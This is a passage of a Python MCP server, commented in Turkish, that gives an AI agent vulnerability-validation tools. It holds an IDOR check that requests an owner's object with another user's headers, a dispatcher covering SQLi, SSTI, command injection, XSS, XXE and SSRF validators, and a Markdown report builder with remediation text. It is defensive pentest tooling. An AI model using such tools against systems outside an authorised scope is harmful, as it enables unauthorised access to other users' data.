        object_url: Sahibe ait nesne URL'i (örn /api/order/1001)
        owner_headers_json: Nesnenin SAHİBİ kimlik başlıkları (JSON)
        attacker_headers_json: Farklı bir kullanıcı kimlik başlıkları (JSON)
    """
    owner_h = _headers(owner_headers_json)
    atk_h = _headers(attacker_headers_json)
    owner = _request("GET", object_url, headers=owner_h, allow_redirects=False)
    if not owner.get("ok") or owner.get("status") not in (200, 206):
        return _result("IDOR", object_url, INCONCLUSIVE, "content_match",
                       {"owner_status": owner.get("status")}, "-",
                       notes="Sahip isteği 200 dönmedi — geçerli owner kimliği ver.")
    atk = _request("GET", object_url, headers=atk_h, allow_redirects=False)
    sim = _similar(owner, atk)
    if atk.get("ok") and atk.get("status") in (200, 206) and sim >= 0.92:
        return _result("Insecure Direct Object Reference (IDOR)", object_url, CONFIRMED,
                       "content_match",
                       {"owner_status": owner["status"], "attacker_status": atk["status"],
                        "content_similarity": sim},
                       [_curl("GET", object_url, headers=owner_h),
                        _curl("GET", object_url, headers=atk_h)],
                       notes="Farklı kimlik, sahibin nesnesinin aynısını aldı → yetkilendirme eksik (IDOR).")
    return _result("Insecure Direct Object Reference (IDOR)", object_url, UNCONFIRMED,
                   "content_match",
                   {"attacker_status": atk.get("status"), "content_similarity": sim},
                   "-", notes="Saldırgan kimliği sahibin verisine erişemedi (beklenen).")


# ─────────────────────────── Dispatcher + Rapor ───────────────────────────
_DISPATCH = {
    "sqli": validate_sqli, "sql injection": validate_sqli, "sql": validate_sqli,
    "ssti": validate_ssti, "template injection": validate_ssti,
    "command injection": validate_command_injection, "cmdi": validate_command_injection,
    "rce": validate_command_injection, "os command injection": validate_command_injection,
    "lfi": validate_path_traversal, "path traversal": validate_path_traversal,
    "file inclusion": validate_path_traversal, "directory traversal": validate_path_traversal,
    "xss": validate_xss_reflection, "cross-site scripting": validate_xss_reflection,
    "open redirect": validate_open_redirect, "redirect": validate_open_redirect,
    "xxe": validate_xxe,
    "auth bypass": validate_auth_bypass, "authentication bypass": validate_auth_bypass,
    "authorization": validate_auth_bypass,
    "idor": validate_idor,
    "ssrf": validate_ssrf_oob,
}


@mcp.tool()
def validate_finding(vuln_type: str, target_url: str = "", params_json: str = "{}") -> str:
    """Genel doğrulama yönlendiricisi — vuln_type'a göre doğru deterministik
    validator'ı seçer. memory-server'daki bir bulguyu tek çağrıyla doğrulamak için.

    Args:
        vuln_type: Zafiyet tipi ('sqli','ssti','xss','lfi','command injection','open redirect','idor','auth bypass','xxe','ssrf')
        target_url: Hedef URL (çoğu validator için)
        params_json: Validator'a iletilecek ek argümanlar (JSON), örn:
            {"param":"id","method":"GET","headers_json":"{}"} veya
            IDOR için {"object_url":"...","owner_headers_json":"...","attacker_headers_json":"..."}
    """
    key = (vuln_type or "").strip().lower()
    fn = _DISPATCH.get(key)
    if not fn:
        for k, v in _DISPATCH.items():
            if k in key:
                fn = v
                break
    if not fn:
        return json.dumps({
            "verdict": ERROR,
            "error": f"Desteklenmeyen vuln_type: '{vuln_type}'",
            "supported": sorted(set(_DISPATCH.keys())),
        }, indent=2, ensure_ascii=False)
    try:
        kwargs = json.loads(params_json) if params_json else {}
        if not isinstance(kwargs, dict):
            kwargs = {}
    except Exception:
        kwargs = {}
    if target_url and "target_url" not in kwargs and fn not in (validate_auth_bypass, validate_idor):
        kwargs["target_url"] = target_url
    if fn is validate_auth_bypass and target_url and "protected_url" not in kwargs:
        kwargs["protected_url"] = target_url
    if fn is validate_idor and target_url and "object_url" not in kwargs:
        kwargs["object_url"] = target_url
    try:
        return fn(**kwargs)
    except TypeError as e:
        return json.dumps({"verdict": ERROR, "validator": fn.__name__,
                           "error": f"Eksik/yanlış argüman: {e}"},
                          indent=2, ensure_ascii=False)


@mcp.tool()
def generate_validation_report(result_json: str, target: str = "",
                               remediation: str = "") -> str:
    """Bir doğrulama sonucundan (herhangi bir validator çıktısı) XBOW-tarzı,
    yeniden üretilebilir bir Markdown kanıt raporu üretir (PoC + reproduction).

    Args:
        result_json: Bir validator'ın döndürdüğü JSON sonuç
        target: (opsiyonel) hedef adı/scope override
        remediation: (opsiyonel) önerilen düzeltme metni
    """
    try:
        r = json.loads(result_json)
    except Exception as e:
        return f"HATA: result_json parse edilemedi: {e}"

    verdict = r.get("verdict", "?")
    icon = {"CONFIRMED": "✅", "UNCONFIRMED": "⬜", "INCONCLUSIVE": "⚠️", "ERROR": "❌"}.get(verdict, "•")
    sev = r.get("severity", "info")
    conf = r.get("confidence", 0.0)
    repro = r.get("reproduction", [])
    if isinstance(repro, str):
        repro = [repro]
    ev = r.get("evidence", {})
    default_rem = {
        "SQL Injection": "Parametreli sorgu (prepared statement) kullan; ORM bind; input allowlist.",
        "Server-Side Template Injection": "Kullanıcı girdisini template'e koyma; sandbox'lı engine; autoescape.",
        "OS Command Injection": "Shell çağrısından kaçın; argüman dizisi + allowlist; shell=False.",
        "Path Traversal / LFI": "Yol normalize + canonical kök kontrolü; allowlist; kullanıcı yolunu dosya sistemine verme.",
        "Reflected XSS": "Bağlama duyarlı output encoding; CSP; framework auto-escape.",
        "Open Redirect": "Yönlendirme hedefini allowlist'le; göreli yol zorla.",
        "Authentication/Authorization Bypass": "Sunucu tarafı erişim kontrolü; her istekte yetki doğrula.",
        "Insecure Direct Object Reference (IDOR)": "Nesne sahipliğini sunucuda doğrula; dolaylı referans haritası.",
        "XML External Entity (XXE)": "DTD/external entity'leri kapat; güvenli XML parser config.",
    }
    vt = r.get("vuln_type", "Finding")
    rem = remediation or next((v for k, v in default_rem.items() if k in vt), "Girdi doğrulama ve güvenli kodlama uygula.")

    lines = [
        f"# {icon} Doğrulama Raporu — {vt}",
        "",
        f"- **Hedef:** `{target or r.get('target','-')}`",
        f"- **Verdict:** **{verdict}** ({icon})",
        f"- **Şiddet (severity):** {sev}",
        f"- **Güven (deterministik):** {conf}",
        f"- **Oracle:** `{r.get('oracle','-')}`",
        f"- **Zaman:** {r.get('timestamp','-')}",
        "",
        "## Kanıt (Evidence)",
        "```json",
        json.dumps(ev, indent=2, ensure_ascii=False),
        "```",
        "",
        "## Yeniden Üretim (Reproduction)",
    ]
    if repro and repro != ["-"]:
        lines.append("```bash")
        lines.extend(repro)
        lines.append("```")
    else:
        lines.append("_Yeniden üretim adımı yok (doğrulanmadı)._")
    lines += [
        "",
        "## Notlar",
        r.get("notes", "-"),
        "",
        "## False-Positive Koruması",
        r.get("false_positive_guard", "-"),
        "",
        "## Düzeltme (Remediation)",
        rem,
        "",
        "---",
        f"_CCO Deterministik Validator — audit: `{r.get('audit_trail','(kaydedilmedi)')}`_",
    ]
    return "\n".join(lines)


if __name__ == "__main__":
    mcp.run()
